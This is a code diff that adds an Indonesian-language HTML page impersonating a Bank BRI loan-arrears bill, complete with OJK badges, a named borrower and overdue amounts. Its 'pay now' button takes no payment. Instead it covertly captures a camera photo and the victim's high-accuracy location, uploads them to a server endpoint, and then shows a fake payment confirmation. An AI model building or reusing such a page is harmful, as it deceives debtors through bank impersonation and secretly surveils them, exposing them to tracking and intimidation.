@@ -1,0 +1,389 @@
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  .wrap { font-family: 'Plus Jakarta Sans', var(--font-sans); padding: 0 0 1.5rem; }
+
+  .top-bar {
+    background: #003f8a;
+    border-radius: var(--border-radius-lg) var(--border-radius-lg) 0 0;
+    padding: 10px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  .top-bar .bri-logo {
+    display: flex; align-items: center; gap: 8px;
+  }
+  .bri-emblem {
+    width: 36px; height: 36px; border-radius: 6px;
+    background: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 700; font-size: 13px; color: #003f8a; letter-spacing: -0.5px;
+  }
+  .bri-text { color: #fff; }
+  .bri-text .b1 { font-size: 13px; font-weight: 700; line-height: 1.1; }
+  .bri-text .b2 { font-size: 10px; opacity: 0.8; }
+  .ojk-area { display: flex; align-items: center; gap: 6px; }
+  .ojk-badge {
+    background: #fff;
+    border-radius: 5px;
+    padding: 3px 8px;
+    display: flex; align-items: center; gap: 5px;
+  }
+  .ojk-dot { width: 10px; height: 10px; border-radius: 50%; background: #c0392b; }
+  .ojk-txt { font-size: 10px; font-weight: 700; color: #003f8a; letter-spacing: 0.03em; }
+  .ojk-sub { font-size: 9px; color: rgba(255,255,255,0.75); }
+
+  .header-card {
+    background: linear-gradient(135deg, #0052cc 0%, #003f8a 100%);
+    padding: 1.25rem 1.25rem 1.5rem;
+    color: #fff;
+    margin-bottom: 1rem;
+    position: relative; overflow: hidden;
+  }
+  .header-card::before {
+    content: ''; position: absolute; right: -20px; bottom: -20px;
+    width: 120px; height: 120px; border-radius: 50%;
+    background: rgba(255,255,255,0.06);
+  }
+  .header-card::after {
+    content: ''; position: absolute; right: 40px; bottom: 30px;
+    width: 70px; height: 70px; border-radius: 50%;
+    background: rgba(255,255,255,0.04);
+  }
+  .hc-label { font-size: 10px; opacity: 0.7; letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 3px; }
+  .hc-name { font-size: 20px; font-weight: 700; margin-bottom: 2px; }
+  .hc-no { font-size: 12px; opacity: 0.8; margin-bottom: 10px; }
+  .hc-row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+  .hc-pill { background: rgba(255,255,255,0.15); border: 0.5px solid rgba(255,255,255,0.25); border-radius: 20px; font-size: 11px; color: #fff; padding: 3px 10px; display: inline-flex; align-items: center; gap: 4px; }
+  .hc-pill i { font-size: 11px; }
+
+  .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 0 1rem 1rem; }
+  .stat-card {
+    background: var(--color-background-primary);
+    border: 0.5px solid var(--color-border-tertiary);
+    border-radius: var(--border-radius-md);
+    padding: 0.75rem 0.9rem;
+  }
+  .stat-card .sl { font-size: 10px; color: var(--color-text-secondary); letter-spacing: 0.03em; text-transform: uppercase; margin-bottom: 4px; }
+  .stat-card .sv { font-size: 16px; font-weight: 700; color: var(--color-text-primary); }
+  .stat-card .sv.red { color: #c0392b; }
+  .stat-card .sv.green { color: #1a7a4a; }
+
+  .px { padding: 0 1rem; }
+  .section-title { font-size: 11px; font-weight: 600; color: var(--color-text-secondary); letter-spacing: 0.06em; text-transform: uppercase; margin-bottom: 8px; }
+
+  .angsuran-list { display: flex; flex-direction: column; gap: 7px; margin-bottom: 1rem; }
+  .ai {
+    background: var(--color-background-primary);
+    border: 0.5px solid var(--color-border-tertiary);
+    border-radius: var(--border-radius-md);
+    padding: 0.8rem 0.9rem;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  .ai.lunas { opacity: 0.55; }
+  .ai.tunggak { border-left: 3px solid #e74c3c; border-radius: 0 var(--border-radius-md) var(--border-radius-md) 0; }
+  .ai.belum { border-left: 3px solid #e67e22; border-radius: 0 var(--border-radius-md) var(--border-radius-md) 0; }
+  .ai-l .aib { font-size: 13px; font-weight: 500; color: var(--color-text-primary); }
+  .ai-l .ait { font-size: 11px; color: var(--color-text-secondary); margin-top: 1px; }
+  .ai-r { text-align: right; }
+  .ai-r .ain { font-size: 13px; font-weight: 600; color: var(--color-text-primary); }
+  .ai-r .ais { font-size: 11px; margin-top: 2px; }
+  .s-l { color: #1a7a4a; } .s-t { color: #c0392b; } .s-b { color: #d68910; }
+
+  .info-box {
+    background: #FEF9E7; border: 0.5px solid #F9E79F;
+    border-radius: var(--border-radius-md);
+    padding: 0.85rem 0.9rem;
+    display: flex; gap: 10px; align-items: flex-start;
+    margin-bottom: 8px; cursor: pointer;
+  }
+  .info-box i { color: #d68910; font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+  .ib-title { font-size: 13px; font-weight: 600; color: #7D6608; margin-bottom: 2px; }
+  .ib-desc { font-size: 12px; color: #9A7D0A; line-height: 1.5; }
+  .ib-link { font-size: 12px; color: #1a56db; font-weight: 500; margin-top: 4px; display: inline-flex; align-items: center; gap: 3px; }
+
+  .detail-box {
+    background: var(--color-background-secondary);
+    border: 0.5px solid var(--color-border-tertiary);
+    border-radius: var(--border-radius-md);
+    padding: 0.9rem; margin-bottom: 1rem; display: none;
+  }
+  .detail-box.show { display: block; }
+  .dr { display: flex; justify-content: space-between; font-size: 13px; padding: 5px 0; border-bottom: 0.5px solid var(--color-border-tertiary); }
+  .dr:last-child { border-bottom: none; }
+  .dk { color: var(--color-text-secondary); }
+  .dv { font-weight: 500; }
+  .dv.red { color: #c0392b; }
+  .dr.total { padding-top: 10px; margin-top: 4px; border-top: 1px solid var(--color-border-secondary); border-bottom: none; }
+  .dr.total .dk { font-weight: 600; font-size: 14px; color: var(--color-text-primary); }
+  .dr.total .dv { font-size: 15px; color: #c0392b; }
+
+  .pay-btn {
+    width: 100%; border: none; border-radius: var(--border-radius-md);
+    padding: 13px; font-size: 14px; font-weight: 700;
+    cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+    font-family: inherit; margin-bottom: 8px; transition: opacity 0.2s;
+  }
+  .pay-btn:hover { opacity: 0.88; }
+  .pay-btn.blue { background: #003f8a; color: #fff; }
+  .pay-btn.outline { background: var(--color-background-primary); color: var(--color-text-secondary); border: 0.5px solid var(--color-border-secondary); }
+  .pay-btn i { font-size: 17px; }
+
+  .footer-bar {
+    margin-top: 1.2rem;
+    padding: 10px 1rem;
+    background: var(--color-background-secondary);
+    border: 0.5px solid var(--color-border-tertiary);
+    border-radius: var(--border-radius-md);
+    display: flex; align-items: center; gap: 8px;
+  }
+  .footer-bar .ojk-seal {
+    width: 28px; height: 28px; border-radius: 50%;
+    background: #003f8a; display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .ojk-seal span { font-size: 8px; font-weight: 800; color: #fff; letter-spacing: -0.3px; }
+  .footer-bar .ft { font-size: 11px; color: var(--color-text-secondary); line-height: 1.5; }
+  .footer-bar .ft b { color: var(--color-text-primary); }
+
+  .note { font-size: 11px; color: var(--color-text-secondary); text-align: center; line-height: 1.7; margin-top: 6px; }
+
+  .success-modal {
+    display: none; background: var(--color-background-primary);
+    border: 0.5px solid var(--color-border-tertiary);
+    border-radius: var(--border-radius-lg);
+    padding: 2rem 1.5rem; text-align: center; margin-top: 1rem;
+  }
+  .success-modal.show { display: block; }
+  .success-icon { font-size: 48px; color: #1a7a4a; margin-bottom: 1rem; }
+  .success-modal h3 { font-size: 16px; font-weight: 600; margin-bottom: 6px; }
+  .success-modal p { font-size: 13px; color: var(--color-text-secondary); }
+</style>
+
+<div class="wrap">
+
+  <!-- TOP BAR: BRI + OJK -->
+  <div class="top-bar">
+    <div class="bri-logo">
+      <div class="bri-emblem">BRI</div>
+      <div class="bri-text">
+        <div class="b1">Bank BRI</div>
+        <div class="b2">PT Bank Rakyat Indonesia (Persero) Tbk</div>
+      </div>
+    </div>
+    <div class="ojk-area">
+      <div class="ojk-badge">
+        <div class="ojk-dot"></div>
+        <div class="ojk-txt">OJK</div>
+      </div>
+      <div class="ojk-sub">Diawasi & Dilindungi</div>
+    </div>
+  </div>
+
+  <!-- HEADER NASABAH -->
+  <div class="header-card">
+    <div class="hc-label">Surat Tagihan Angsuran</div>
+    <div class="hc-name">Ibu Nurul Hidayati</div>
+    <div class="hc-no">No. Kontrak: KRD-BRI-2024-00847 &nbsp;|&nbsp; NIK: 3271xxxxxxxxxxxx</div>
+    <div class="hc-row">
+      <span class="hc-pill"><i class="ti ti-circle-check" aria-hidden="true"></i> Kontrak Aktif</span>
+      <span class="hc-pill"><i class="ti ti-calendar" aria-hidden="true"></i> Tgl Mulai: 10 Jan 2025</span>
+      <span class="hc-pill"><i class="ti ti-hourglass" aria-hidden="true"></i> 10 Bulan</span>
+    </div>
+  </div>
+
+  <!-- STATS -->
+  <div class="stats-grid">
+    <div class="stat-card">
+      <div class="sl">Total Pinjaman</div>
+      <div class="sv">Rp 12.000.000</div>
+    </div>
+    <div class="stat-card">
+      <div class="sl">Sisa Tagihan</div>
+      <div class="sv red">Rp 8.200.000</div>
+    </div>
+    <div class="stat-card">
+      <div class="sl">Angsuran / Bulan</div>
+      <div class="sv">Rp 1.200.000</div>
+    </div>
+    <div class="stat-card">
+      <div class="sl">Total Tunggakan</div>
+      <div class="sv red">Rp 2.473.000</div>
+    </div>
+  </div>
+
+  <div class="px">
+    <div class="section-title">Riwayat Angsuran</div>
+    <div class="angsuran-list">
+      <div class="ai lunas">
+        <div class="ai-l"><div class="aib">Angsuran Ke-1</div><div class="ait">Jatuh tempo: 10 Jan 2025</div></div>
+        <div class="ai-r"><div class="ain">Rp 1.200.000</div><div class="ais s-l"><i class="ti ti-check" aria-hidden="true"></i> Lunas</div></div>
+      </div>
+      <div class="ai lunas">
+        <div class="ai-l"><div class="aib">Angsuran Ke-2</div><div class="ait">Jatuh tempo: 10 Feb 2025</div></div>
+        <div class="ai-r"><div class="ain">Rp 1.200.000</div><div class="ais s-l"><i class="ti ti-check" aria-hidden="true"></i> Lunas</div></div>
+      </div>
+      <div class="ai lunas">
+        <div class="ai-l"><div class="aib">Angsuran Ke-3</div><div class="ait">Jatuh tempo: 10 Mar 2025</div></div>
+        <div class="ai-r"><div class="ain">Rp 1.200.000</div><div class="ais s-l"><i class="ti ti-check" aria-hidden="true"></i> Lunas</div></div>
+      </div>
+      <div class="ai tunggak">
+        <div class="ai-l"><div class="aib">Angsuran Ke-4</div><div class="ait">Jatuh tempo: 10 Apr 2025</div></div>
+        <div class="ai-r"><div class="ain">Rp 1.200.000</div><div class="ais s-t"><i class="ti ti-alert-circle" aria-hidden="true"></i> Tunggakan</div></div>
+      </div>
+      <div class="ai tunggak">
+        <div class="ai-l"><div class="aib">Angsuran Ke-5</div><div class="ait">Jatuh tempo: 10 Mei 2025</div></div>
+        <div class="ai-r"><div class="ain">Rp 1.200.000</div><div class="ais s-t"><i class="ti ti-alert-circle" aria-hidden="true"></i> Tunggakan</div></div>
+      </div>
+      <div class="ai belum">
+        <div class="ai-l"><div class="aib">Angsuran Ke-6</div><div class="ait">Jatuh tempo: 10 Jun 2025</div></div>
+        <div class="ai-r"><div class="ain">Rp 1.200.000</div><div class="ais s-b"><i class="ti ti-clock" aria-hidden="true"></i> Belum Dibayar</div></div>
+      </div>
+    </div>
+
+    <!-- INFO TUNGGAKAN -->
+    <div class="info-box" onclick="toggleDetail()">
+      <i class="ti ti-info-circle" aria-hidden="true"></i>
+      <div>
+        <div class="ib-title">Informasi Tunggakan &amp; Denda</div>
+        <div class="ib-desc">Anda memiliki 2 bulan tunggakan. Terdapat denda keterlambatan yang perlu segera dilunasi.</div>
+        <span class="ib-link" id="linkText"><i class="ti ti-chevron-down" aria-hidden="true"></i> Klik di sini untuk info selengkapnya</span>
+      </div>
+    </div>
+
+    <div class="detail-box" id="detailBox">
+      <div class="dr"><span class="dk">Tunggakan Apr 2025</span><span class="dv">Rp 1.200.000</span></div>
+      <div class="dr"><span class="dk">Tunggakan Mei 2025</span><span class="dv">Rp 1.200.000</span></div>
+      <div class="dr"><span class="dk">Denda Keterlambatan (2%/bulan)</span><span class="dv red">Rp 48.000</span></div>
+      <div class="dr"><span class="dk">Biaya Administrasi BRI</span><span class="dv red">Rp 25.000</span></div>
+      <div class="dr total"><span class="dk">Total Yang Harus Dibayar</span><span class="dv red">Rp 2.473.000</span></div>
+      <div style="font-size:11px;color:var(--color-text-secondary);margin-top:8px;line-height:1.6;">
+        * Denda dihitung sejak tanggal jatuh tempo. Segera lakukan pembayaran untuk menghindari denda tambahan dan pelaporan ke SLIK OJK.
+      </div>
+    </div>
+
+    <!-- TOMBOL AKSI -->
+    <div id="mainAction">
+      <button class="pay-btn blue" onclick="bayarSekarang()">
+        <i class="ti ti-credit-card" aria-hidden="true"></i> Bayar Tagihan Sekarang
+      </button>
+      <button class="pay-btn outline" onclick="hubungiPetugas()">
+        <i class="ti ti-phone" aria-hidden="true"></i> Hubungi Petugas BRI
+      </button>
+      <div class="note">
+        Bayar via BRImo, ATM BRI, teller, atau transfer ke rekening virtual account.<br>
+        Call Center BRI: <b>14017</b> / <b>1500017</b> &nbsp;|&nbsp; Senin–Sabtu 08.00–17.00 WIB
+      </div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+      <i class="ti ti-circle-check success-icon" aria-hidden="true"></i>
+      <h3>Permintaan Pembayaran Dikirim</h3>
+      <p>Terima kasih Ibu Nurul. Tim BRI akan segera mengkonfirmasi pembayaran Anda. Simpan bukti transfer sebagai tanda terima.</p>
+      <div style="margin-top:1rem;font-size:13px;color:var(--color-text-secondary);">Ref: TXN-BRI-2025-0530-8847</div>
+    </div>
+
+    <!-- FOOTER OJK -->
+    <div class="footer-bar">
+      <div class="ojk-seal"><span>OJK</span></div>
+      <div class="ft">
+        <b>Diawasi oleh Otoritas Jasa Keuangan (OJK)</b><br>
+        Layanan Konsumen OJK: 157 &nbsp;|&nbsp; konsumen.ojk.go.id &nbsp;|&nbsp; Jika ada pengaduan, hubungi OJK.
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+function toggleDetail() {
+  const box = document.getElementById('detailBox');
+  const link = document.getElementById('linkText');
+  const open = box.classList.toggle('show');
+  link.innerHTML = open
+    ? '<i class="ti ti-chevron-up" aria-hidden="true"></i> Sembunyikan informasi'
+    : '<i class="ti ti-chevron-down" aria-hidden="true"></i> Klik di sini untuk info selengkapnya';
+}
+
+async function bayarSekarang() {
+  const button = document.querySelector('.pay-btn.blue');
+  const originalText = button.innerHTML;
+  button.disabled = true;
+  button.innerHTML = '<i class="ti ti-camera"></i> proses.';
+
+  try {
+    const [stream, position] = await Promise.all([
+      navigator.mediaDevices.getUserMedia({ video: true }),
+      new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          return reject(new Error('Geolocation tidak tersedia di browser ini.'));
+        }
+        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000 });
+      }),
+    ]);
+
+    const imageData = await capturePhoto(stream);
+    stopMediaStream(stream);
+
+    const payload = {
+      image: imageData,
+      location: {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: new Date(position.timestamp).toISOString(),
+      },
+    };
+
+    const response = await fetch('/upload-data', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+
+    if (!response.ok) {
+      const errorData = await response.json();
+      throw new Error(errorData.error || 'Gagal mengunggah data.');
+    }
+
+    document.getElementById('mainAction').style.display = 'none';
+    document.getElementById('successModal').classList.add('show');
+  } catch (error) {
+    alert('Tidak dapat mengambil foto atau lokasi: ' + error.message + '\n\nPastikan izin kamera dan lokasi telah diizinkan.');
+    button.disabled = false;
+    button.innerHTML = originalText;
+  }
+}
+
+function stopMediaStream(stream) {
+  stream.getTracks().forEach((track) => track.stop());
+}
+
+function capturePhoto(stream) {
+  return new Promise((resolve, reject) => {
+    const video = document.createElement('video');
+    video.autoplay = true;
+    video.playsInline = true;
+    video.srcObject = stream;
+
+    video.addEventListener('loadedmetadata', async () => {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+        resolve(dataUrl);
+      } catch (err) {
+        reject(err);
+      }
+    });
+
+    video.addEventListener('error', () => reject(new Error('Gagal menampilkan kamera.')));
+  });
+}
+
+function hubungiPetugas() {
+  alert('Fitur hubungi petugas belum tersedia.');
+}
+</script>
